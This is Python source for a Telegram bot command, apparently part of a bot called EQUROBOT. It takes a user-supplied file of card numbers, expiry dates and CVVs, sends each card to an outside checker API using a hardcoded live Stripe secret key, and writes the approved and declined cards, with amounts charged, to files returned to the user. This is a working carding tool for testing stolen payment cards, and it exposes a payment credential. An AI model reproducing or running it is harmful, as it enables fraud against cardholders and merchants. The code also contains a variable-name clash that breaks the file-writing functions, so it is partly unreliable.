from EQUROBOT import app
import aiohttp
import asyncio
import re
import os
from pyrogram import filters

async def process_credit_card(cc_entry, message):
    try:
        x = re.findall(r'\d+', cc_entry)
        if len(x) != 4:
            print(f'Invalid CC format in file: {cc_entry}')
            return
        
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]

        VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
        if not ccn.startswith(VALID):
            print(f'Invalid CC type in file: {cc_entry}')
            return

        async with aiohttp.ClientSession() as session:
            url = "https://mvy.ai/sk_api/api.php"
            params = {
                "lista": f"{ccn}:{mm}:{yy}:{cvv}",
                "sk": "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"
            }

            async with session.get(url, params=params) as response:
                r = await response.json()

                if r['status'] == 'die':
                    fullcc = f"{ccn}|{mm}|{yy}|{cvv}"
                    await write_to_declined_file(fullcc, r['message'])

                elif r['status'] == 'approved':
                    fullcc = f"{ccn}|{mm}|{yy}|{cvv}"
                    amount_charged = r['payment_info']['amount']
                    await write_to_approved_file(fullcc, r['message'], amount_charged)

                else:
                    print(f"Unknown status received for {cc_entry}: {r['status']}")

    except Exception as e:
        print(f"Error processing CC entry: {e}")

async def write_to_approved_file(fullcc, message, amount):
    try:
        approved_filename = f'{message.from_user.id}approved.txt'
        with open(approved_filename, 'a') as file:
            file.write(f"{fullcc} - Approved: {message} - Amount Charged: ${amount}\n")
    except Exception as e:
        print(f"Error writing to approved file: {e}")

async def write_to_declined_file(fullcc, message):
    try:
        declined_filename = f'{message.from_user.id}declined.txt'
        with open(declined_filename, 'a') as file:
            file.write(f"{fullcc} - Declined: {message}\n")
    except Exception as e:
        print(f"Error writing to declined file: {e}")

@app.on_message(filters.command("mchk", prefixes=[".", "/"]))
async def check_cc_file(_, message):
    try:
        reply_msg = message.reply_to_message
        if reply_msg and reply_msg.document:
            file_id = reply_msg.document.file_id
            file_path = await app.download_media(file_id)

            with open(file_path, 'r') as file:
                tasks = []
                for line in file:
                    cc_entry = line.strip()
                    task = asyncio.create_task(process_credit_card(cc_entry, message))
                    tasks.append(task)

                await asyncio.gather(*tasks)
            
            await message.reply_document(f"{message.from_user.id}approved.txt")
            await message.reply_document(f"{message.from_user.id}declined.txt")

            os.remove(file_path)
            os.remove(f"{message.from_user.id}approved.txt")
            os.remove(f"{message.from_user.id}declined.txt")

        else:
            await message.reply_text("Please reply to a text file containing credit card details.")

    except Exception as e:
        await message.reply_text(f"Error reading CC file: {e}")
